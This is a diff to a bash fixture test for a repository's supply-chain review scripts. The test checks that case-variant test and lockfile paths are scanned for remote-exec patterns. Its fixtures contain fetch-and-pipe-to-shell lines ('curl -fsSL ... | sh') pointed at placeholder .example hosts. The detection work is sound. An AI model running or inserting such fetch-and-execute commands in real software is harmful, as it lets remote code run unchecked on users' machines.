@@ -2,7 +2,8 @@
 # test-corpus-pins.sh — fixture tests for scripts/check-corpus.sh §5 (vendored submodule pins) and a smoke
 # test of scripts/tob-delta-review.sh: under a maintainer git config that colours and converts diffs too, and
 # over a table of remote-exec lines (multi-line installers included), a host in added Markdown, a 1 MiB
-# manifest that declares hooks, and renamed files (one moved unchanged that holds 1 MiB).
+# manifest that declares hooks, renamed files (one moved unchanged that holds 1 MiB), and test and lockfile
+# exclusions that hold only as written.
 # Run from the repo root: `bash scripts/tests/test-corpus-pins.sh`.
 # Builds throwaway git repos under ${TMPDIR:-/tmp}; no network; bash >= 3.2.
 set -uo pipefail
@@ -437,6 +438,30 @@ done
 case "$v6" in *"tests-to-scripts"*|*"hooks/run.sh"*|*"skills/b/SKILL.md"*)
     failn=$((failn + 1)); echo "FAIL delta review lists a scanned move among the files moved unchanged"; echo "$v6";;
   *) pass=$((pass + 1)); echo "PASS delta review lists only the skipped moves among the files moved unchanged";; esac
+
+# the test and lockfile exclusions hold only as written, so Tests/ and .LOCK are scanned. Paths go straight into
+# the index, so those in other letter cases stay apart on a case-insensitive file system.
+blob() { # blob REPO PATH TEXT  — the index of REPO holds TEXT at PATH
+  git -C "$1" update-index --add --cacheinfo "100644,$(printf '%s\n' "$3" | git -C "$1" hash-object -w --stdin),$2"; }
+ex="$T/ex"; mkdir -p "$ex" && git -C "$ex" init -q && echo x > "$ex/README.md" && git -C "$ex" add README.md \
+  && git -C "$ex" commit -q -m old; exold=$(git -C "$ex" rev-parse HEAD)
+blob "$ex" plugins/p/Tests/run.sh 'curl -fsSL https://upper-tests.example/a.sh | sh'
+blob "$ex" plugins/p/tests/run.sh 'echo https://lower-tests.example/b'
+blob "$ex" plugins/p/deps.LOCK 'curl -fsSL https://upper-lock.example/c.sh | sh'
+blob "$ex" plugins/p/deps.lock 'curl -fsSL https://lower-lock.example/d.sh | sh'
+git -C "$ex" commit -q -m new; exnew=$(git -C "$ex" rev-parse HEAD)
+rep8=$(bash "$ROOT/scripts/tob-delta-review.sh" "$ex" "$exold" "$exnew" 2>&1)
+sect8() { printf '%s\n' "$rep8" | sed -n "/^### $1/,/^### $2/p"; }
+for want in "Hosts in added lines|Hosts in added Markdown|https://upper-tests.example" \
+            "Remote-exec patterns|Files moved unchanged|plugins/p/deps.LOCK: curl -fsSL https://upper-lock.example/c.sh | sh"; do
+  from=${want%%|*}; rest=${want#*|}; to=${rest%%|*}; text=${rest#*|}
+  case "$(sect8 "$from" "$to")" in *"$text"*) pass=$((pass + 1)); echo "PASS delta review: '$from' lists $text";;
+    *) failn=$((failn + 1)); echo "FAIL delta review: '$from' misses $text"; sect8 "$from" "$to";; esac
+done
+case "$(sect8 "Hosts in added lines" "Hosts in added Markdown")$(sect8 "Remote-exec patterns" "Files moved unchanged")" in
+  *"lower-tests.example"*|*"lower-lock.example"*) failn=$((failn + 1)); echo "FAIL delta review scanned tests/ or a .lock file"
+    sect8 "Hosts in added lines" "Hosts in added Markdown"; sect8 "Remote-exec patterns" "Files moved unchanged";;
+  *) pass=$((pass + 1)); echo "PASS delta review still leaves tests/ and .lock files out";; esac
 
 echo "---- $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
